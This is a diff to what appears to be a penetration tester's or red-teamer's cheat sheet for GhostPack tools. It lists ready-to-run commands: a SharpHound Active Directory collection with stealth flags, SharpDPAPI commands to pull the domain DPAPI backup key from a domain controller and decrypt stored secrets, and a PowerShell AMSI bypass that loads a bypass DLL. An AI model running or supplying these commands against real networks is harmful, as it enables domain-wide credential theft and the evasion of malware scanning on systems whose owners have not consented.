@@ -18,8 +18,9 @@ GhostPack Tools
   SharpHound.exe -c All,Loggedon [-s|-d] --Throttle 20 --Jitter 7 --NoSaveCache --RandomFilenames --EncryptZip
   Rubeus.exe (Kerberose Tool)
   SharpDPAPI.exe
-    - SharpDPAPI -backupkey (must have a DA account to get domain backup key)
-    - SharpDPAPI machinetriage
+    - SharpDPAPI backupkey /server:dc01.fqdn /file:keyname.pvk (file is optional; base64 without)
+    - SharpDPAPI traiage /pvk:key.pvk or /pvk:Base64
+    - SharpDPAPI machinetriage (must be system)
   AMSIBypass - Rastamouse
     - [System.Reflection.Assembly]::LoadFile("D:\Tools\ASBBypass\ASBBypass\bin\Release\ASBBypass.dll")
     - [Amsi]::Bypass()
